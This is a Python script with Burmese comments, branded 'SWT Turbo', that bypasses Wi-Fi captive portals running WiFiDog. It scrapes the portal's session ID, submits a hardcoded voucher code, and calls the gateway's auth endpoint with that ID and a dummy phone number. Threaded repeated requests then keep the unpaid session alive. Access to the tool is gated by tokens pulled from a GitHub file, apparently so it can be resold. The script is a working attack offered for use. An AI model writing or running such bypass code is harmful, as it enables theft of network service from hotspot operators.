import requests
import re
import urllib3
import time
import threading
import os
import sys
import psutil
import json
from urllib.parse import urlparse, parse_qs, urljoin

# SSL Warning များကို ပိတ်ထားရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
TOKEN_URL = "https://raw.githubusercontent.com/demoppal/demo/refs/heads/main/token.txt"
EXPIRE_LOG = ".expired_tokens.json"  # Expire ဖြစ်သွားသော Token များမှတ်ရန်ဖိုင်
PING_THREADS = 5
PING_INTERVAL = 0.1 

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def load_expired_tokens():
    """သိမ်းထားသော Expired Token များကို ဖတ်ရန်"""
    if os.path.exists(EXPIRE_LOG):
        try:
            with open(EXPIRE_LOG, "r") as f:
                return json.load(f)
        except: return {}
    return {}

def save_expired_token(token):
    """Token သက်တမ်းကုန်ဆုံးပါက မှတ်တမ်းသွင်းရန်"""
    data = load_expired_tokens()
    data[token] = "expired"
    with open(EXPIRE_LOG, "w") as f:
        json.dump(data, f)

def show_banner():
    clear_screen()
    banner = """
    \033[1;32m
    ##########################################
    #                                        #
    #              SWT  TURBO                #
    #        FAST & UNLIMITED ACCESS         #
    #                                        #
    ##########################################
    \033[0m
    """
    print(banner)

def get_data_usage():
    try:
        net_io = psutil.net_io_counters()
        total_bytes = net_io.bytes_sent + net_io.bytes_recv
        return total_bytes / (1024 * 1024)
    except: return 0

def get_valid_token():
    try:
        show_banner()
        user_token = input("\033[1;33m[*] Enter Token Number to Activate Access:\033[0m\n> ").strip()
        
        # အရင်ဆုံး သုံးပြီးသား Token ဟုတ်မဟုတ်စစ်မည်
        expired_list = load_expired_tokens()
        if user_token in expired_list:
            print("\n\033[1;31m[!] This token has already EXPIRED and cannot be used again!\033[0m")
            sys.exit()
        
        headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
        response = requests.get(TOKEN_URL, headers=headers, timeout=10)
        allowed_data = response.text.splitlines()
        
        for entry in allowed_data:
            if ":" in entry:
                token_num, token_time = entry.split(":")
                if token_num == user_token:
                    print(f"\033[1;32m[+] Token Accepted! Duration: {token_time} minutes.\033[0m")
                    time.sleep(1)
                    return user_token, int(token_time)
        
        print(f"\n\033[1;31m[!] Invalid Token! {user_token} is not valid.\033[0m")
        sys.exit()
        
    except Exception as e:
        print(f"[!] Token Check Error: {e}")
        sys.exit()

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, session, sid):
    while True:
        try:
            session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    # Token နှင့် မိနစ်ကို ရယူသည်
    token_name, token_minutes = get_valid_token()
    
    start_session_time = time.time()
    token_limit = start_session_time + (token_minutes * 60)
    
    show_banner()
    print(f"\033[1;32m[+] Session Valid for: {token_minutes} minutes.\033[0m")
    print(f"\n\033[1;33m[1] Start SWT Turbo Internet\n[0] Exit\033[0m")
    
    if input("\nSelect Option: ") != '1':
        sys.exit()
        
    clear_screen()
    show_banner()
    print("[*] Initializing system... Connecting to Gateway...")
    
    start_time = time.time()
    start_data = get_data_usage()

    while True:
        # အချိန်ကုန်မကုန် စစ်ဆေးခြင်း
        current_now = time.time()
        if current_now > token_limit:
            print("\n\n\033[1;31m[!] Token Expired! Please get a new token.\033[0m")
            save_expired_token(token_name) # Expire ဖြစ်သွားကြောင်း မှတ်တမ်းတင်သည်
            sys.exit()

        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    elapsed = time.time() - start_time
                    mins, secs = divmod(int(elapsed), 60)
                    hours, mins = divmod(mins, 60)
                    
                    remaining_sec = token_limit - time.time()
                    rem_m, rem_s = divmod(int(remaining_sec), 60)
                    
                    current_data = get_data_usage() - start_data
                    print(f"\r\033[1;36m[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Used: {current_data:.2f} MB | Left: {rem_m:02d}:{rem_s:02d} | Status: OK\033[0m", end='', flush=True)
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try:
                    session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                except: pass

                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while check_real_internet():
                    if time.time() > token_limit: break
                    time.sleep(5)

        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        print("\n\nStopped by User.")
        sys.exit()
        
